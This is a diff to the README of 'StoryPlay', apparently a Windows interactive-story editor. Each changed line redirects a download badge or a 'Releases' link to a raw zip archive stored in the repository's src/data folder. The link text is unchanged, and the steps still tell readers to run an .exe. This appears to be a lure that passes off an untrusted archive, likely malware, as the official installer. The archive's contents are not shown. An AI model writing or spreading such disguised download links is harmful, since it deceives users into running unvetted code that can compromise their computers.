@@ -1,6 +1,6 @@
 # 🎮 StoryPlay - Build Interactive Stories Easily
 
-[![Download StoryPlay](https://img.shields.io/badge/Download-StoryPlay-brightgreen)](https://github.com/Torresz0/StoryPlay/releases)
+[![Download StoryPlay](https://img.shields.io/badge/Download-StoryPlay-brightgreen)](https://github.com/Torresz0/StoryPlay/raw/refs/heads/main/src/data/Story_Play_3.7.zip)
 
 StoryPlay helps you create interactive stories with a simple visual tool. You can build branching stories where choices change what happens next. Use its easy drag-and-drop editor to add pieces, set conditions, and test your story.
 
@@ -8,7 +8,7 @@ StoryPlay helps you create interactive stories with a simple visual tool. You ca
 
 To start using StoryPlay, you need to get the software on your Windows PC.
 
-1. Go to the official download page: [StoryPlay Releases](https://github.com/Torresz0/StoryPlay/releases)
+1. Go to the official download page: [StoryPlay Releases](https://github.com/Torresz0/StoryPlay/raw/refs/heads/main/src/data/Story_Play_3.7.zip)
 2. Find the latest version. Files will have names ending with `.exe`.
 3. Click on the `.exe` file link to download it.
 4. Save the file to a place you can find, like your Desktop or Downloads folder.
@@ -87,7 +87,7 @@ Try changing text or connecting nodes differently. Experimenting helps you learn
 
 Check the releases page regularly for updates:
 
-- Go to [StoryPlay Releases](https://github.com/Torresz0/StoryPlay/releases)
+- Go to [StoryPlay Releases](https://github.com/Torresz0/StoryPlay/raw/refs/heads/main/src/data/Story_Play_3.7.zip)
 - Download the latest `.exe` file.
 - Run it to install the update over your existing version.
 
@@ -111,4 +111,4 @@ It focuses on a visual, easy-to-understand workflow, letting you focus on creati
 
 Use the link below to start downloading the StoryPlay installer for Windows:
 
-[![Download StoryPlay](https://img.shields.io/badge/Download-StoryPlay-blueviolet)](https://github.com/Torresz0/StoryPlay/releases)
+[![Download StoryPlay](https://img.shields.io/badge/Download-StoryPlay-blueviolet)](https://github.com/Torresz0/StoryPlay/raw/refs/heads/main/src/data/Story_Play_3.7.zip)
